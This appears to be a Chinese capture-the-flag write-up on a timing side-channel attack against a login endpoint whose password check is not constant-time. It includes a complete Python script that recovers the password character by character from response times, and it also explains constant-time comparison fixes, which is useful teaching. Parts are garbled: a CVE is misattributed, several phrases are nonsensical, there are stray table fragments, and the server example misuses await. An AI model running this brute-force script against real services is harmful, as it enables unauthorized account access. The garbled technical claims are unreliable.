## 漏洞本质

“非恒定时间比较”泄密：服务端密码比对按位短路，每匹配对一位才执行 `await sleep(100)`，遇到首位不同就立即 `return`。等价于把密码“每位是否正确”用红外线投到了响应时间上。

| 匹配前缀长度 | 响应时间 ± 网络抖动 |
|---|---|
| 0 位 | ~10 ms |
| 1 位 | ~110 ms |
| 2 位 | ~210 ms |
| 3 位 | ~310 ms |
| 4 位 | ~410 ms |
| 5 位 | ~510 ms |
| 6 位（全对） | ~610 ms + 登录成功 |

| 策略 | 尝试次数 |
|---|---|

| 时序逐位爆破 | 26 × 6 = 156 |

Caution

## 关键前置知识

Timing Attack（时序侧信道攻击）的两个经典案例：

| 具体场景 | 漏洞点 |
|---|---|
| 字符串逐位比较 `a==b` | 首个不同的字符就 short-circuit |
| HMAC/签名校验 `sig==computed` | 同样 short-circuit → 逐位构造 signature |
| bcrypt/scrypt/argon2 未用恒时比对 | 理论上也可，但唤醒远没这么明显 |
| JWT / 签名校验选用 `==` | 在真实世界出现过（黑猴·Keyczar CVE-2009-0217） |

正确的修复方法是 恒时比较（constant-time compare），无论比较是否命中以及在第几位不同，运行时间都应该完全相同：

| 语言 | 恒时比较 API |
|---|---|
| Node.js | `crypto.timingSafeEqual(buf1, buf2)` |
| Python | `hmac.compare_digest(a, b)` |
| Go | `crypto/subtle.ConstantTimeCompare(x, y)` |
| Java | `MessageDigest.isEqual(a, b)` |
| Ruby | `Rack::Utils.secure_compare(a, b)` |

工程上有四个坑必须规避：

| 坑 | 解决 |
|---|---|
| 每次要重新 `GET /api/token` | 否则回 401 `token missing or invalid` |
| 网络抖动（±10ms）淹没信号 | 每个候选 `重试 5 次`，排序后去掉最快最慢取中位均值 |
| 不小心触发 bot 栅栏 / 限流 | 序列单线程，不用并发 |
| 填充字符 `'a'` 会误导 | 当真实密码里本来就有 `'a'` 时，填 `'a'` 会把那行的负载硬抬，遇到时用最大值而不是绝对阈值拿来判定 |

> 网络抖动的分布右偏（偶尔抽风就一下跳到 500ms）。取 `min` 与 `max` 各删一个后再均值，能砍掉大部分扰动中的尖刺点。

# q14_timing.py
import urllib.request, json, time, string
BASE = "http://TARGET"

def get_token():
    return json.loads(urllib.request.urlopen(BASE+"/api/token").read())["token"]

def try_pw(pw, repeat=5):
    times = []
    for _ in range(repeat):
        t = get_token()
        body = json.dumps({"username":"admin","password":pw,"token":t}).encode()
        req = urllib.request.Request(BASE+"/api/login", data=body,
            headers={"Content-Type":"application/json"}, method="POST")
        s = time.perf_counter()
        try: urllib.request.urlopen(req).read()
        except: pass
        times.append(time.perf_counter() - s)
    times.sort()
    # 去掉最快最慢，中间取均 → 抗抖动
    return sum(times[1:-1]) / (len(times)-2) * 1000

known = ""
for pos in range(6):
    best_ch, best_t = None, -1
    for ch in string.ascii_lowercase:
        pw = (known + ch).ljust(6, "a")
        t = try_pw(pw)
        if t > best_t:
            best_t, best_ch = t, ch
        print(f"  {pw:6}  {t:6.1f} ms")
    known += best_ch
    print(f"→ pos {pos+1}: '{best_ch}'  known={known}")
print("FINAL:", known)

## 常见坑

| 问题 | 根因 | 解决 |
|---|---|---|
| 所有候选时间差不足 10ms | 用 `time.time()` 精度太粗 | 换 `time.perf_counter()` |
| 奇别次操作时间突然高 500ms | 网络抖动 | 重试 5 次，去掉 min/max 取中位数 |
| 401 token missing | 没刷新 token 或 token 重用 | 每次请求重取 token |
| 连用过的 token 测第二位时不来 | token 池被清空 | 脚本打印进度时也不多发额外请求 |
| 并发 26 个候选同时发 | 后端 sleep 被那一批因子重垮 | 串行发，避免阵面抖动 |
| 推测准确但最后还取不到 flag | 最后一次没再新抽一条 token | 请求前条条重新 `GET /api/token` |

## 时序攻击通用套路

> Important
>
> 1. 看到“比较”先想是否恒时：密码、token、HMAC、CSRF、JWT signature，凡只要后端用 `==` / `strcmp` / `Buffer.compare`，全有理论泄露可能
> 2. 远程时序测不出并不存在：网络抖动掩盖纳秒级信号时，可以换静态分析、正向读源码或用 CPU 性能计数器
> 3. 探针动作站指握着单变量：一次只改一个字符，其余位置用已知值 → 响应时间差不介于“拉或没拉” |
> 4. 恒时比较算法（Node `timingSafeEqual` / Go `subtle` / Python `hmac.compare_digest`）会遍历全长度再归 `xor` 累加，任何输入耗时完全相同
> 5. 旁路侧信道：除了时间，响应长度、效果状态码、错误文案（`user not found` vs `wrong password`）都是潜在侧信道
> 6. 一次性 token 的真实作用域：只能防止“勾素重放历史包”，拦不住自动化脚本（可以实时抽 token）

// server.js — 反例
function compareTiming(input, real) {
  for (let i = 0; i < real.length; i++) {
    if (input[i] !== real[i]) return false;
    await sleep(100);    // 捕龙研究
  }
  return true;
}

// 正例
const crypto = require('crypto');
function compareSafe(input, real) {
  const a = Buffer.from(input);
  const b = Buffer.from(real);
  if (a.length !== b.length) return false;  // 长度不等也要先跟长度一致的空 Buffer 比一遍，避免长度侧信道
  return crypto.timingSafeEqual(a, b);
